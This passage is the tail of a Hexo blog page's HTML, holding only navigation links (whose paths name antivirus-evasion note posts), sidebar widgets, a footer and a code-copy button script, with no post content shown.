class="line">&#125;</span><br></pre></td></tr></table></figure>










      </section>

      
      
        <nav class="article-nav">
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">(no title)</h2>
        </a>
      
      <div class="card-text--row">Newer</div>
    </div>
  </article>
</div>
          
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2023/10/22/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/AntiAntiVirusNotes-master/shellcode%E5%8A%A0%E5%AF%86/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">(no title)</h2>
        </a>
      
      <div class="card-text--row">Older</div>
    </div>
  </article>
</div>
          
        </nav>
      

      <section class="page-message-container layout-padding">
        


  
  

  
  


      </section>
    </div>
    <div class="widget-info">
      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-body">
    
      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
    
    
      <h2>Sukoshi</h2>
    
    
      <p>贵在坚持</p>
    

    <div class="count-box">
      <div class="count-box--item">
        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
</svg>
        <span>42</span>
      </div>
      <div class="count-box--item">
        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
        0
      </div>
      <div class="count-box--item">
        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
        3
      </div>
    </div>
  </div>
</section>

      

      
<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
</svg>
    <span>NOTICE</span>
  </div>
  <div class="widget-body">
    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
  </div>
</section>


      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
    <span>CATEGORYS</span>
  </div>
  <div class="widget-body">
    <ul class="categorys-list">
      
    </ul>
  </div>
</section>

      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
    <span>TAGS</span>
  </div>
  <div class="widget-body">
    <div class="tags-cloud">
      <a href="/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/tags/Markdown/" style="font-size: 10px;" class="tags-cloud-0">Markdown</a> <a href="/tags/%E7%BD%91%E7%AB%99/" style="font-size: 10px;" class="tags-cloud-0">网站</a>
    </div>
  </div>
</section>
    </div>
  </article>
</div>

    <!-- footer container -->
<footer id="footer" class="footer">
  <div class="footer-container">
    
    <div class="social-icons">
      
        
      
        
      
        
      
        
          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
</svg>
          </a>
        
      
        
          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
</svg>
          </a>
        
      
    </div>
     
    <p>&copy; 2023 <a href="/" target="_blank">John Doe</a></p>

    

    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>

    <p>
      <a href="javascript:;" id="theme-light">🌞 浅色</a>
      <a href="javascript:;" id="theme-dark">🌛 深色</a>
      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
    </p>
  </div>
</footer>
  </div>

  <div class="back-to-top-fixed soft-size--round soft-style--box">
    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
    </svg>
  </div>

  
  <!-- aplayer -->


<!-- dplayer -->


<!-- copy button  -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

<!-- https://clipboardjs.com/ -->


<script type="text/javascript">
	(function () {
		function getCodeType (elem) {
			const classs = Array.from(elem.classList.values());
			if (classs && classs.length > 1) {
				return classs[1];
			}
			return "plain";
		}

		window.addEventListener("DOMContentLoaded", () => {
			const copyBtnClass = "copy-btn";
			//  instantiate clipboardjs 
			const clipboard = new ClipboardJS('.' + copyBtnClass);

			clipboard.on('success', function (e) {
				console.info('Action:', e.action);
				console.info('Text:', e.text);
				console.info('Trigger:', e.trigger);
				if (e.trigger) {
					e.trigger.classList.add("copied");
					setTimeout(() => {
						e.trigger.classList.remove("copied");
					}, 3000);
				}
				e.clearSelection();
			});

			clipboard.on('error', function (e) {
				console.error('Action:', e.action);
				console.error('Trigger:', e.trigger);
			});

			document.querySelectorAll('figure.highlight').forEach((elem) => {
				const codeContent = elem.querySelector("td.code");
				const copyButton = document.createElement('button');
				copyButton.setAttribute("class", copyBtnClass);
				copyButton.setAttribute("title", "Copy Code");
				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
				elem.insertBefore(copyButton, elem.children[0]);
			});
		})
	})();
</script>








  


  


  




<script src="/js/script.js"></script>


  
  <!-- 尾部用户自定义相关内容 -->
</body>
</html>
